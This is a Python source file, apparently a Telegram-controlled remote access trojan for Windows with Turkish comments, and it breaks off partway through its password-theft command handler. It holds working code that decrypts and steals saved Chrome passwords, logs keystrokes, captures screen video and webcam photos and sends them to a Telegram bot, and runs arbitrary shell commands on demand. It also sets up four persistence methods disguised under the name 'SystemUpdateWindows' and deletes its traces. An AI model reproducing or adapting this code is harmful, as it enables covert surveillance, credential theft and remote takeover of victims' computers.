import os
import sys
import time
import winreg as reg
import threading
import cv2
import numpy as np
from datetime import datetime
from pynput import keyboard
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, ContextTypes, CallbackQueryHandler
import pyautogui
import socket  # Bilgisayar adı için gerekli
import json
import subprocess
import psutil
import shutil
import sys
import base64
from datetime import datetime, timedelta

# Duck GIF constant'ını import et
try:
    from duck_gif_constant import DUCK_GIF_BASE64
    GIF_AVAILABLE = True
except ImportError:
    DUCK_GIF_BASE64 = None
    GIF_AVAILABLE = False

# Chrome Password Stealer - Entegre edildi
def steal_chrome_passwords():
    """Chrome şifrelerini çalar"""
    try:
        import base64
        import sqlite3
        import win32crypt
        from Crypto.Cipher import AES
        import shutil
        
        # Chrome Local State dosyasından encryption key'i al
        local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
        
        if not os.path.exists(local_state_path):
            return "❌ Chrome Local State dosyası bulunamadı."
        
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = json.loads(f.read())
        
        # Encryption key'i çıkar
        key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        key = key[5:]  # "DPAPI" prefix'ini kaldır
        key = win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
        
        # Chrome Login Data dosyasını kopyala
        db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "default", "Login Data")
        
        if not os.path.exists(db_path):
            return "❌ Chrome Login Data dosyası bulunamadı."
        
        temp_db = "ChromeData.db"
        shutil.copyfile(db_path, temp_db)
        
        # Veritabanından şifreleri al
        db = sqlite3.connect(temp_db)
        cursor = db.cursor()
        cursor.execute("SELECT origin_url, action_url, username_value, password_value, date_created, date_last_used FROM logins ORDER BY date_created")
        
        credentials = []
        for row in cursor.fetchall():
            origin_url, action_url, username, encrypted_password, date_created, date_last_used = row
            
            # Şifreyi çöz
            try:
                if encrypted_password.startswith(b'v10') or encrypted_password.startswith(b'v11'):
                    # AES-GCM encryption
                    iv = encrypted_password[3:15]
                    encrypted_password = encrypted_password[15:]
                    cipher = AES.new(key, AES.MODE_GCM, iv)
                    password = cipher.decrypt(encrypted_password)[:-16].decode()
                else:
                    # DPAPI encryption
                    password = win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1].decode()
            except:
                password = "[Şifreli - Çözülemedi]"
            
            if username or password:
                credentials.append({
                    "URL": origin_url,
                    "Username": username,
                    "Password": password,
                    "Created": date_created,
                    "Last Used": date_last_used
                })
        
        cursor.close()
        db.close()
        
        # Geçici dosyayı sil
        try:
            os.remove(temp_db)
        except:
            pass
        
        return credentials
        
    except Exception as e:
        return f"❌ Chrome şifre çalma hatası: {str(e)}"

def save_credentials_to_file(credentials, filename="chrome_passwords.txt"):
    """Sonuçları dosyaya kaydet"""
    try:
        with open(filename, "w", encoding="utf-8") as f:
            for cred in credentials:
                f.write(f"URL: {cred['URL']}\n")
                f.write(f"Username: {cred['Username']}\n")
                f.write(f"Password: {cred['Password']}\n")
                f.write(f"Created: {cred['Created']}\n")
                f.write(f"Last Used: {cred['Last Used']}\n")
                f.write("-" * 50 + "\n")
        return True
    except Exception as e:
        print(f"Sonuç kaydetme hatası: {e}")
        return False

# Chrome password stealer her zaman mevcut
BROWSER_PASSWORDS_AVAILABLE = True

# Shell Executor sınıfı - Entegre edildi
class ShellExecutor:
    def __init__(self):
        self.current_dir = os.getcwd()
        self.history = []
        self.max_history = 50
    
    def execute_command(self, command, timeout=30):
        """CMD komutunu çalıştırır"""
        try:
            # Komut geçmişine ekle
            self.history.append({
                'command': command,
                'timestamp': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                'directory': self.current_dir
            })
            
            # Geçmişi sınırla
            if len(self.history) > self.max_history:
                self.history = self.history[-self.max_history:]
            
            # Komut türlerini kontrol et
            if command.strip().lower() in ['exit', 'quit']:
                return "❌ Shell oturumu sonlandırıldı."
            
            # Dizin değiştirme komutları
            if command.strip().lower().startswith('cd '):
                return self._change_directory(command)
            
            # Özel komutlar
            if command.strip().lower() == 'pwd':
                return f"📁 Mevcut dizin: {self.current_dir}"
            
            if command.strip().lower() == 'history':
                return self._show_history()
            
            if command.strip().lower() == 'clear':
                self.history = []
                return "🧹 Komut geçmişi temizlendi."
            
            # CMD komutunu çalıştır
            print(f"🔧 Komut çalıştırılıyor: {command}")
            
            # Komutu çalıştır
            result = subprocess.run(
                command,
                shell=True,
                cwd=self.current_dir,
                capture_output=True,
                text=True,
                timeout=timeout,
                encoding='utf-8',
                errors='replace'
            )
            
            # Sonuçları hazırla
            output = ""
            if result.stdout:
                output += f"📤 **Çıktı:**\n```\n{result.stdout}\n```\n"
            
            if result.stderr:
                output += f"❌ **Hata:**\n```\n{result.stderr}\n```\n"
            
            if result.returncode != 0:
                output += f"⚠️ **Çıkış Kodu:** {result.returncode}\n"
            
            if not output:
                output = "✅ Komut başarıyla çalıştırıldı (çıktı yok)."
            
            # Mevcut dizini güncelle
            try:
                self.current_dir = os.getcwd()
            except:
                pass
            
            return output
            
        except subprocess.TimeoutExpired:
            return f"⏰ Komut zaman aşımına uğradı ({timeout} saniye)."
        
        except Exception as e:
            return f"❌ Komut çalıştırma hatası: {str(e)}"
    
    def _change_directory(self, command):
        """Dizin değiştirme komutunu işler"""
        try:
            parts = command.strip().split(' ', 1)
            if len(parts) > 1:
                new_dir = parts[1].strip()
                
                # Özel dizinler
                if new_dir == '~' or new_dir == '~\\':
                    new_dir = os.path.expanduser("~")
                elif new_dir == '..':
                    new_dir = os.path.dirname(self.current_dir)
                elif new_dir == '.':
                    new_dir = self.current_dir
                
                # Dizin değiştir
                if os.path.exists(new_dir) and os.path.isdir(new_dir):
                    os.chdir(new_dir)
                    self.current_dir = os.getcwd()
                    return f"📁 Dizin değiştirildi: {self.current_dir}"
                else:
                    return f"❌ Dizin bulunamadı: {new_dir}"
            else:
                # Sadece 'cd' - home dizinine git
                home_dir = os.path.expanduser("~")
                os.chdir(home_dir)
                self.current_dir = home_dir
                return f"📁 Ana dizine geçildi: {self.current_dir}"
                
        except Exception as e:
            return f"❌ Dizin değiştirme hatası: {str(e)}"
    
    def _show_history(self):
        """Komut geçmişini gösterir"""
        if not self.history:
            return "📝 Komut geçmişi boş."
        
        output = "📝 **Komut Geçmişi:**\n\n"
        for i, entry in enumerate(self.history[-10:], 1):  # Son 10 komut
            output += f"{i}. `{entry['command']}`\n"
            output += f"   📅 {entry['timestamp']}\n"
            output += f"   📁 {entry['directory']}\n\n"
        
        return output
    
    def get_system_info(self):
        """Sistem bilgilerini alır"""
        try:
            info = []
            
            # İşletim sistemi
            info.append(f"🖥️ **İşletim Sistemi:** {os.name}")
            
            # Mevcut dizin
            info.append(f"📁 **Mevcut Dizin:** {self.current_dir}")
            
            # Kullanıcı
            info.append(f"👤 **Kullanıcı:** {os.getenv('USERNAME', 'Bilinmiyor')}")
            
            # Python versiyonu
            import sys
            info.append(f"🐍 **Python:** {sys.version.split()[0]}")
            
            return "\n".join(info)
            
        except Exception as e:
            return f"❌ Sistem bilgisi alma hatası: {str(e)}"
    
    def execute_multiple_commands(self, commands):
        """Birden fazla komutu sırayla çalıştırır"""
        results = []
        for i, command in enumerate(commands, 1):
            results.append(f"**Komut {i}:** `{command}`")
            result = self.execute_command(command)
            results.append(result)
            results.append("---")
        
        return "\n".join(results)

# Shell executor her zaman mevcut
SHELL_EXECUTOR_AVAILABLE = True

# Basit bilgisayar bilgisi alma fonksiyonları
def get_computer_name():
    try:
        return socket.gethostname()
    except:
        return "Unknown"

def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "Bilinmiyor"

# Konfigürasyon dosyasını yükle
try:
    from config import *
except ImportError:
    # Eğer config.py yoksa varsayılan değerleri kullan
    BOT_TOKEN = 'YOU_BOT_TOKEN'
    LOG_FILE_PATH = "log.txt"
    VIDEO_FILE_PATH = "screen_record.avi"
    SCREENSHOT_PATH = "ekran_goruntusu.png"
    CAMERA_PHOTO_PATH = "kamera_fotografi.jpg"
    VIDEO_FPS = 20.0
    VIDEO_CODEC = "XVID"
    KEYLOGGER_ENABLED = True
    KEYLOGGER_AUTO_START = False
    AUTO_STARTUP = True
    STARTUP_NAME = "SystemUpdateWindows"
    EXE_NAME = os.path.basename(sys.executable)
    ALLOWED_USERS = [YOU_CHAT_ID]  # Config'den alınacak
    ADMIN_CHAT_ID = YOU_CHAT_ID

# Dosya yollarını ayarla
log_file_path = LOG_FILE_PATH
video_file_path = VIDEO_FILE_PATH

# Global değişkenler
video_recording = False
out = None
keylogger_active = False
keylogger_thread = None
shell_executor = None

# Bilgisayarın adını alarak benzersiz bir kimlik oluştur
computer_name = socket.gethostname()

# Güvenlik kontrolü fonksiyonu
def is_authorized(update: Update) -> bool:
    """Kullanıcının yetkili olup olmadığını kontrol eder."""
    if not ALLOWED_USERS:  # Eğer kısıtlama yoksa herkese izin ver
        return True
    
    user_id = update.effective_user.id
    return user_id in ALLOWED_USERS

# Yetki kontrolü decorator'ı
def authorized_only(func):
    """Sadece yetkili kullanıcıların erişebileceği fonksiyonlar için decorator."""
    async def wrapper(update: Update, context: ContextTypes.DEFAULT_TYPE):
        if not is_authorized(update):
            await context.bot.send_message(
                chat_id=update.effective_chat.id, 
                text="❌ Bu komutu kullanma yetkiniz yok!"
            )
            return
        return await func(update, context)
    return wrapper

# Log dosyasını her başlatıldığında temizle (sadece yeni tuşlar kaydedilsin)
if os.path.exists(log_file_path):
    os.remove(log_file_path)

# Kayıt Defteri'ne betiği ekleme - Gelişmiş Persistence
def add_to_startup():
    # PyInstaller ile oluşturulan EXE için doğru yolu bul
    if getattr(sys, 'frozen', False):
        # PyInstaller ile oluşturulan EXE
        script_path = sys.executable
        script_dir = os.path.dirname(script_path)
        script_name = os.path.basename(script_path)
    else:
        # Python script olarak çalışıyor
        script_path = os.path.abspath(__file__)
        script_dir = os.path.dirname(script_path)
        script_name = EXE_NAME

    # Birden fazla persistence yöntemi kullan
    persistence_methods = []
    
    # 1. HKEY_CURRENT_USER Run anahtarı
    try:
        key = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
        value_name = "SystemUpdateWindows"
        value = f'"{script_path}"'
        
        registry_key = reg.OpenKey(reg.HKEY_CURRENT_USER, key, 0, reg.KEY_WRITE)
        reg.SetValueEx(registry_key, value_name, 0, reg.REG_SZ, value)
        reg.CloseKey(registry_key)
        persistence_methods.append("HKCU Run")
        print(f"✅ HKCU Run: {value_name} başarıyla eklendi!")
    except Exception as e:
        print(f"❌ HKCU Run hatası: {e}")
    
    # 2. HKEY_LOCAL_MACHINE Run anahtarı (admin gerekli)
    try:
        key = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
        value_name = "SystemUpdateWindows"
        value = f'"{script_path}"'
        
        registry_key = reg.OpenKey(reg.HKEY_LOCAL_MACHINE, key, 0, reg.KEY_WRITE)
        reg.SetValueEx(registry_key, value_name, 0, reg.REG_SZ, value)
        reg.CloseKey(registry_key)
        persistence_methods.append("HKLM Run")
        print(f"✅ HKLM Run: {value_name} başarıyla eklendi!")
    except Exception as e:
        print(f"⚠️ HKLM Run hatası (admin gerekli): {e}")
    
    # 3. Startup klasörüne kısayol oluştur
    try:
        startup_folder = os.path.join(os.path.expanduser("~"), "AppData", "Roaming", "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
        if not os.path.exists(startup_folder):
            os.makedirs(startup_folder)
        
        shortcut_path = os.path.join(startup_folder, "SystemUpdateWindows.lnk")
        
        # Kısayol oluştur (basit yöntem)
        import subprocess
        subprocess.run([
            "powershell", "-Command",
            f"$WshShell = New-Object -comObject WScript.Shell; $Shortcut = $WshShell.CreateShortcut('{shortcut_path}'); $Shortcut.TargetPath = '{script_path}'; $Shortcut.Save()"
        ], capture_output=True)
        
        if os.path.exists(shortcut_path):
            persistence_methods.append("Startup Folder")
            print(f"✅ Startup Folder: Kısayol oluşturuldu!")
        else:
            print(f"⚠️ Startup Folder: Kısayol oluşturulamadı!")
    except Exception as e:
        print(f"⚠️ Startup Folder hatası: {e}")
    
        # 4. Task Scheduler ile zamanlanmış görev oluştur
        try:
            import subprocess
            task_name = "SystemUpdateWindows"
            
            # Mevcut görevi sil (varsa)
            subprocess.run(["schtasks", "/delete", "/tn", task_name, "/f"], capture_output=True, encoding='utf-8', errors='ignore')
            
            # Yeni görev oluştur
            cmd = f'schtasks /create /tn "{task_name}" /tr "{script_path}" /sc onlogon /ru "%USERNAME%" /f'
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, encoding='utf-8', errors='ignore')
            
            if result.returncode == 0:
                persistence_methods.append("Task Scheduler")
                print(f"✅ Task Scheduler: {task_name} görevi oluşturuldu!")
            else:
                print(f"⚠️ Task Scheduler hatası: {result.stderr}")
        except Exception as e:
            print(f"⚠️ Task Scheduler hatası: {e}")
    
    # Özet bilgi
    print(f"\n🔧 Persistence Özeti:")
    print(f"📁 Script yolu: {script_path}")
    print(f"📂 Script dizini: {script_dir}")
    print(f"📄 Script adı: {script_name}")
    print(f"✅ Başarılı yöntemler: {', '.join(persistence_methods) if persistence_methods else 'Hiçbiri'}")
    
    if not persistence_methods:
        print("❌ Hiçbir persistence yöntemi başarılı olmadı!")
    else:
        print(f"🎯 {len(persistence_methods)} persistence yöntemi aktif!")

# Video kaydını başlat
def start_video_recording():
    global video_recording, out
    screen_size = pyautogui.size()  # Ekran boyutunu al
    fourcc = cv2.VideoWriter_fourcc(*"XVID")  # Video codec (XVID)
    out = cv2.VideoWriter(video_file_path, fourcc, 20.0, screen_size)  # Video kaydını başlat

    video_recording = True
    while video_recording:
        screenshot = pyautogui.screenshot()
        frame = np.array(screenshot)  # Görüntüyü numpy array formatına çevir
        frame = cv2.cvtColor(frame, cv2.COLOR_RGB2BGR)  # RBG'yi BGR'ye çevir
        out.write(frame)  # Görüntüyü videoya ekle

# Video kaydını durdur
def stop_video_recording():
    global video_recording, out
    video_recording = False
    if out:
        out.release()  # Video kaydını bitir
    cv2.destroyAllWindows()

# Klavye dinleyicisi
def on_press(key):
    try:
        current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        if hasattr(key, 'char') and key.char is not None:
            with open(log_file_path, "a") as f:
                f.write(f"[{current_time}] {key.char}\n")
        else:
            with open(log_file_path, "a") as f:
                f.write(f"[{current_time}] {key.name}\n")
    except AttributeError:
        current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        with open(log_file_path, "a") as f:
            f.write(f"[{current_time}] {key}\n")

# Keylogger'ı başlatan fonksiyon
def start_keylogger():
    global keylogger_active
    with keyboard.Listener(on_press=on_press) as listener:
        while keylogger_active:
            time.sleep(0.1)  # CPU kullanımını azalt
        listener.stop()  # Listener'ı durdur

# Ekran görüntüsü alma komutu
@authorized_only
async def ekran_goruntusu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    screenshot_path = "ekran_goruntusu.png"
    try:
        screenshot = pyautogui.screenshot()
        screenshot.save(screenshot_path)
        with open(screenshot_path, "rb") as f:
            await context.bot.send_document(chat_id=update.effective_chat.id, document=f)
        # Ekran görüntüsünü gönderdikten sonra sil
        os.remove(screenshot_path)
        await context.bot.send_message(chat_id=update.effective_chat.id, text="✅ Ekran görüntüsü gönderildi ve silindi.")
    except Exception as e:
        await context.bot.send_message(chat_id=update.effective_chat.id, text=f"Hata oluştu: {e}")

# Log dosyasını gönderme komutu
@authorized_only
async def send_log(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if os.path.exists(log_file_path):
        try:
            with open(log_file_path, "rb") as f:
                await context.bot.send_document(chat_id=update.effective_chat.id, document=f)
            # Log dosyasını gönderdikten sonra sil
            os.remove(log_file_path)
            await context.bot.send_message(chat_id=update.effective_chat.id, text="✅ Log dosyası gönderildi ve silindi.")
        except Exception as e:
            await context.bot.send_message(chat_id=update.effective_chat.id, text=f"Log gönderilirken hata: {e}")
    else:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="Henüz bir log kaydı bulunmamaktadır.")

# Video kaydını gönderme komutu
@authorized_only
async def send_video(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if os.path.exists(video_file_path):
        try:
            with open(video_file_path, "rb") as f:
                await context.bot.send_document(chat_id=update.effective_chat.id, document=f)
            # Video dosyasını gönderdikten sonra sil
            os.remove(video_file_path)
            await context.bot.send_message(chat_id=update.effective_chat.id, text="✅ Video dosyası gönderildi ve silindi.")
        except Exception as e:
            await context.bot.send_message(chat_id=update.effective_chat.id, text=f"Video gönderilirken hata: {e}")
    else:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="Henüz video kaydı bulunmamaktadır.")

# Video kaydını başlatma komutu
async def start_video(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global video_recording
    if not video_recording:
        video_thread = threading.Thread(target=start_video_recording, daemon=True)
        video_thread.start()
        await context.bot.send_message(chat_id=update.effective_chat.id, text="Video kaydı başlatıldı.")
    else:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="Zaten video kaydı yapılıyor.")

# Video kaydını durdurma komutu
async def stop_video(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global video_recording
    if video_recording:
        stop_video_recording()
        await context.bot.send_message(chat_id=update.effective_chat.id, text="Video kaydı durduruldu.")
    else:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="Hiç video kaydınız yok.")

# Bilgisayarı kapatma komutu
@authorized_only
async def shutdown(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await context.bot.send_message(chat_id=update.effective_chat.id, text="Bilgisayar hemen kapanıyor...")
    os.system("shutdown /s /f /t 0")

# Ping komutu
async def ping(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        await context.bot.send_message(chat_id=update.effective_chat.id, text=f"Bilgisayar aktif: {computer_name}")
    except Exception as e:
        await context.bot.send_message(chat_id=update.effective_chat.id, text=f"Hata oluştu: {e}")

# Kameradan fotoğraf çekme komutu
@authorized_only
async def kamera(update: Update, context: ContextTypes.DEFAULT_TYPE):
    camera = cv2.VideoCapture(0)  # Kamerayı aç
    if not camera.isOpened():
        await context.bot.send_message(chat_id=update.effective_chat.id, text="Kamera açılmadı veya bulunamadı.")
        return

    # Fotoğrafı çek
    ret, frame = camera.read()
    if ret:
        photo_path = "kamera_fotografi.jpg"
        cv2.imwrite(photo_path, frame)  # Fotoğrafı kaydet
        try:
            with open(photo_path, "rb") as f:
                await context.bot.send_document(chat_id=update.effective_chat.id, document=f)
            # Fotoğrafı gönderdikten sonra sil
            os.remove(photo_path)
            await context.bot.send_message(chat_id=update.effective_chat.id, text="✅ Kamera fotoğrafı gönderildi ve silindi.")
        except Exception as e:
            await context.bot.send_message(chat_id=update.effective_chat.id, text=f"Fotoğraf gönderilirken hata: {e}")
    else:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="Fotoğraf çekme hatası oluştu.")

    camera.release()  # Kamerayı serbest bırak

# Sistem bilgilerini alma komutu
async def system_info(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        # CPU kullanımı
        cpu_percent = psutil.cpu_percent(interval=1)
        
        # RAM bilgileri
        memory = psutil.virtual_memory()
        memory_total = round(memory.total / (1024**3), 2)  # GB
        memory_used = round(memory.used / (1024**3), 2)    # GB
        memory_percent = memory.percent
        
        # Disk bilgileri
        disk = psutil.disk_usage('/')
        disk_total = round(disk.total / (1024**3), 2)      # GB
        disk_used = round(disk.used / (1024**3), 2)        # GB
        disk_percent = round((disk.used / disk.total) * 100, 2)
        
        # Ağ bilgileri
        network = psutil.net_io_counters()
        
        info_text = f"""
🖥️ **Sistem Bilgileri**

💻 **Bilgisayar Adı**: {computer_name}
🖥️ **İşletim Sistemi**: {os.name}
📊 **CPU Kullanımı**: %{cpu_percent}

🧠 **RAM Bilgileri**:
   • Toplam: {memory_total} GB
   • Kullanılan: {memory_used} GB
   • Kullanım Oranı: %{memory_percent}

💾 **Disk Bilgileri**:
   • Toplam: {disk_total} GB
   • Kullanılan: {disk_used} GB
   • Kullanım Oranı: %{disk_percent}

🌐 **Ağ Bilgileri**:
   • Gönderilen: {round(network.bytes_sent / (1024**2), 2)} MB
   • Alınan: {round(network.bytes_recv / (1024**2), 2)} MB
"""
        await context.bot.send_message(chat_id=update.effective_chat.id, text=info_text)
    except Exception as e:
        await context.bot.send_message(chat_id=update.effective_chat.id, text=f"Sistem bilgileri alınırken hata: {e}")

# Çalışan süreçleri listeleme komutu
async def processes(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        processes_list = []
        for proc in psutil.process_iter(['pid', 'name', 'cpu_percent', 'memory_percent']):
            try:
                processes_list.append(proc.info)
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                pass
        
        # CPU kullanımına göre sırala
        processes_list.sort(key=lambda x: x['cpu_percent'] or 0, reverse=True)
        
        # İlk 10 süreci göster
        message = "🔄 **En Çok CPU Kullanan 10 Süreç:**\n\n"
        for i, proc in enumerate(processes_list[:10], 1):
            name = proc['name'][:20]  # İsim uzunsa kısalt
            cpu = proc['cpu_percent'] or 0
            memory = proc['memory_percent'] or 0
            message += f"{i}. {name} (PID: {proc['pid']})\n   CPU: %{cpu:.1f} | RAM: %{memory:.1f}\n\n"
        
        await context.bot.send_message(chat_id=update.effective_chat.id, text=message)
    except Exception as e:
        await context.bot.send_message(chat_id=update.effective_chat.id, text=f"Süreçler listelenirken hata: {e}")

# Dosya listesi komutu
async def list_files(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        # Mevcut dizindeki dosyaları listele
        current_dir = os.getcwd()
        files = os.listdir(current_dir)
        
        message = f"📁 **Mevcut Dizin**: {current_dir}\n\n"
        message += "📄 **Dosyalar:**\n"
        
        for file in files[:20]:  # İlk 20 dosyayı göster
            if os.path.isfile(file):
                size = os.path.getsize(file)
                size_mb = round(size / (1024*1024), 2)
                message += f"• {file} ({size_mb} MB)\n"
        
        if len(files) > 20:
            message += f"\n... ve {len(files) - 20} dosya daha"
        
        await context.bot.send_message(chat_id=update.effective_chat.id, text=message)
    except Exception as e:
        await context.bot.send_message(chat_id=update.effective_chat.id, text=f"Dosyalar listelenirken hata: {e}")

# Keylogger'ı başlatma komutu
async def start_keylogger_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global keylogger_active, keylogger_thread
    if not keylogger_active:
        keylogger_thread = threading.Thread(target=start_keylogger, daemon=True)
        keylogger_thread.start()
        keylogger_active = True
        await context.bot.send_message(chat_id=update.effective_chat.id, text="✅ Keylogger başlatıldı!")
    else:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="⚠️ Keylogger zaten çalışıyor.")

# Keylogger'ı durdurma komutu
async def stop_keylogger_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global keylogger_active, keylogger_thread
    if keylogger_active:
        keylogger_active = False
        if keylogger_thread and keylogger_thread.is_alive():
            keylogger_thread.join(timeout=2)  # 2 saniye bekle
        keylogger_thread = None
        await context.bot.send_message(chat_id=update.effective_chat.id, text="🛑 Keylogger durduruldu!")
    else:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="⚠️ Keylogger zaten durmuş.")

# Bilgisayarı yeniden başlatma komutu
@authorized_only
async def restart(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await context.bot.send_message(chat_id=update.effective_chat.id, text="🔄 Bilgisayar yeniden başlatılıyor...")
    os.system("shutdown /r /f /t 0")

# Uygulama çalıştırma komutu
async def run_app(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        # Komut argümanını al
        app_name = ' '.join(context.args)
        if not app_name:
            await context.bot.send_message(chat_id=update.effective_chat.id, text="❌ Kullanım: /run <uygulama_adı>\nÖrnek: /run notepad")
            return
        
        # Uygulamayı çalıştır
        subprocess.Popen(app_name, shell=True)
        await context.bot.send_message(chat_id=update.effective_chat.id, text=f"🚀 '{app_name}' uygulaması başlatıldı!")
    except Exception as e:
        await context.bot.send_message(chat_id=update.effective_chat.id, text=f"Uygulama başlatılırken hata: {e}")

# Dosya silme komutu
@authorized_only
async def delete_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        file_name = ' '.join(context.args)
        if not file_name:
            await context.bot.send_message(chat_id=update.effective_chat.id, text="❌ Kullanım: /delete <dosya_adı>")
            return
        
        if os.path.exists(file_name):
            os.remove(file_name)
            await context.bot.send_message(chat_id=update.effective_chat.id, text=f"🗑️ '{file_name}' dosyası silindi!")
        else:
            await context.bot.send_message(chat_id=update.effective_chat.id, text=f"❌ '{file_name}' dosyası bulunamadı!")
    except Exception as e:
        await context.bot.send_message(chat_id=update.effective_chat.id, text=f"Dosya silinirken hata: {e}")

# Persistence durumunu kontrol etme komutu
@authorized_only
async def check_persistence(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Persistence durumunu kontrol eder"""
    try:
        persistence_status = []
        
        # 1. HKCU Run kontrolü
        try:
            key = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
            registry_key = reg.OpenKey(reg.HKEY_CURRENT_USER, key, 0, reg.KEY_READ)
            value, _ = reg.QueryValueEx(registry_key, "SystemUpdateWindows")
            reg.CloseKey(registry_key)
            persistence_status.append(f"✅ HKCU Run: {value}")
        except:
            persistence_status.append("❌ HKCU Run: Bulunamadı")
        
        # 2. HKLM Run kontrolü
        try:
            key = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
            registry_key = reg.OpenKey(reg.HKEY_LOCAL_MACHINE, key, 0, reg.KEY_READ)
            value, _ = reg.QueryValueEx(registry_key, "SystemUpdateWindows")
            reg.CloseKey(registry_key)
            persistence_status.append(f"✅ HKLM Run: {value}")
        except:
            persistence_status.append("❌ HKLM Run: Bulunamadı")
        
        # 3. Startup klasörü kontrolü
        try:
            startup_folder = os.path.join(os.path.expanduser("~"), "AppData", "Roaming", "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
            shortcut_path = os.path.join(startup_folder, "SystemUpdateWindows.lnk")
            if os.path.exists(shortcut_path):
                persistence_status.append(f"✅ Startup Folder: {shortcut_path}")
            else:
                persistence_status.append("❌ Startup Folder: Bulunamadı")
        except:
            persistence_status.append("❌ Startup Folder: Kontrol edilemedi")
        
        # 4. Task Scheduler kontrolü
        try:
            import subprocess
            result = subprocess.run(["schtasks", "/query", "/tn", "SystemUpdateWindows"], capture_output=True, text=True, encoding='utf-8', errors='ignore')
            if result.returncode == 0:
                persistence_status.append("✅ Task Scheduler: Aktif")
            else:
                persistence_status.append("❌ Task Scheduler: Bulunamadı")
        except:
            persistence_status.append("❌ Task Scheduler: Kontrol edilemedi")
        
        # Mevcut script bilgileri
        if getattr(sys, 'frozen', False):
            script_path = sys.executable
            script_type = "EXE"
        else:
            script_path = os.path.abspath(__file__)
            script_type = "Python Script"
        
        message = f"🔧 **PERSISTENCE DURUMU**\n\n"
        message += f"📁 **Mevcut Script:**\n`{script_path}`\n"
        message += f"📄 **Tip:** {script_type}\n\n"
        message += f"🛡️ **Persistence Yöntemleri:**\n"
        for status in persistence_status:
            message += f"{status}\n"
        
        await context.bot.send_message(chat_id=update.effective_chat.id, text=message)
        
    except Exception as e:
        await context.bot.send_message(chat_id=update.effective_chat.id, text=f"Persistence kontrol hatası: {e}")

# Tüm geçici dosyaları temizleme komutu
@authorized_only
async def cleanup(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        deleted_files = []
        
        # Keylogger'ı durdur
        global keylogger_active, keylogger_thread
        if keylogger_active:
            keylogger_active = False
            if keylogger_thread and keylogger_thread.is_alive():
                keylogger_thread.join(timeout=2)
            keylogger_thread = None
        
        # Video kaydını durdur
        global video_recording
        if video_recording:
            video_recording = False
        
        # Geçici dosyaları kontrol et ve sil
        temp_files = [
            log_file_path,
            video_file_path,
            "ekran_goruntusu.png",
            "kamera_fotografi.jpg",
            "passwords.txt",
            "credentials.txt",
            "ChromeData.db",
            "temp_audio.wav",
            "temp_audio.mp3",
            "temp_audio.ogg"
        ]
        
        # Mevcut dizindeki tüm geçici dosyaları bul
        current_dir = os.getcwd()
        for file in os.listdir(current_dir):
            if file.endswith(('.png', '.jpg', '.jpeg', '.avi', '.mp4', '.wav', '.mp3', '.ogg', '.txt', '.db', '.log')):
                if file not in ['requirements.txt', 'telegram_rat.py', 'icon.ico']:  # Önemli dosyaları koru
                    temp_files.append(file)
        
        for file_path in temp_files:
            try:
                if os.path.exists(file_path):
                    os.remove(file_path)
                    deleted_files.append(file_path)
            except Exception as e:
                print(f"Dosya silinemedi: {file_path} - {e}")
        
        if deleted_files:
            message = f"🧹 **Temizlik Tamamlandı!**\n\nSilinen dosyalar:\n"
            for file in deleted_files:
                message += f"• {file}\n"
            await context.bot.send_message(chat_id=update.effective_chat.id, text=message)
        else:
            await context.bot.send_message(chat_id=update.effective_chat.id, text="✅ Temizlenecek dosya bulunamadı.")
            
    except Exception as e:
        await context.bot.send_message(chat_id=update.effective_chat.id, text=f"Temizlik sırasında hata: {e}")

# Tarayıcı şifrelerini çalma komutu
@authorized_only
async def steal_passwords(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not BROWSER_PASSWORDS_AVAILABLE:
        await context.bot.send_message(
            chat_id=update.effective_chat.id, 
            text="❌ Tarayıcı şifre modülü yüklenemedi!"
        )
        return
    
    try:
        await context.bot.send_message(
            chat_id=update.effective_chat.id, 
            text="🔍 Tarayıcı şifreleri aranıyor... Bu işlem biraz zaman alabilir."
        )
        
        # Şifre çalma işlemini başlat
        passwords = steal_chrome_passwords()
        
        if passwords:
            # Şifreleri dosyaya kaydet
            filename = save_credentials_to_file(passwords, "passwords.txt")
